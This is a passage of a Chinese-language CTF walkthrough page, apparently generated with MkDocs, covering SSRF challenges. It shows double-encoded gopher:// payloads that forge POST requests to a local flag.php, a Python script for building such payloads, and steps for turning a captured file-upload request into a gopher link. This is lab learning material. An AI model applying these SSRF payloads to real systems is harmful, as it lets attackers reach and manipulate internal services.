+<p><em>如果还是疑惑为什么要两次，大佬详解链接</em><a href="https://redshome.top/posts/2023-01-13-58/">SSRF之gopher协议使用与URL编码转换问题 | Red的小屋</a></p>
+<pre><code>gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250d%250AHost:%2520127.0.0.1:80%250d%250AContent-Type:%2520application/x-www-form-urlencoded%250d%250AContent-Length:%252036%250d%250A%250d%250Akey=b40bb514b81c81d8f238ba14fbd0cff5%250d%250a
+</code></pre>
+<p><img alt="image-20260729222250989" src="../img/image-20260729222250989.png" /></p>
+<p>或者使用python脚本urllib.parse.quote函数，</p>
+<h5 id="gopher_1">大佬gopher编码脚本</h5>
+<p><a href="https://blog.csdn.net/mooyuan/article/details/151332497">CTFHub SSRF通关笔记3-2：Gopher POST请求 原理详解与渗透实战（python脚本法）_python实现post数据生成gopher payload-CSDN博客</a></p>
+<pre><code class="language-python">import urllib.parse
+
+
+
+payload = &quot;&quot;&quot;POST /flag.php HTTP/1.1
+
+Host: 127.0.0.1
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 36
+
+key=b40bb514b81c81d8f238ba14fbd0cff5&quot;&quot;&quot;
+
+print(&quot;[+] 构造的POST请求:&quot;)
+
+print(payload)
+
+print()
+
+
+
+payload = payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)
+
+gopher_payload = f&quot;gopher://127.0.0.1:80/_{urllib.parse.quote(payload)}&quot;
+
+
+
+print(&quot;[+] Gopher URL:&quot;)
+
+print(gopher_payload)
+
+print()
+
+
+
+
+
+final_url = f&quot;?url={urllib.parse.quote(gopher_payload)}&quot;
+
+print(&quot;[+] 最终请求URL:&quot;)
+
+print(final_url)
+
+print()
+</code></pre>
+<p>得到最终请求URL</p>
+<pre><code>?url=gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Db40bb514b81c81d8f238ba14fbd0cff5
+</code></pre>
+<hr />
+<h4 id="5_1">5、上传文件</h4>
+<p>提示查看flag.php</p>
+<p>发现文件上传点，先补上提交按钮，上传一个非空文件</p>
+<pre><code>&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;
+</code></pre>
+<p><img alt="image-20260730223313269" src="../img/image-20260730223313269.png" /></p>
+<p>提交，提示从本地上传，bp抓包</p>
+<p>将这个post请求构造成gopher 链接</p>
+<p>HOST字段改成<code>127.0.0.1:80</code></p>
+<p>用python脚本二次编码得到payload</p>
+<hr /></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
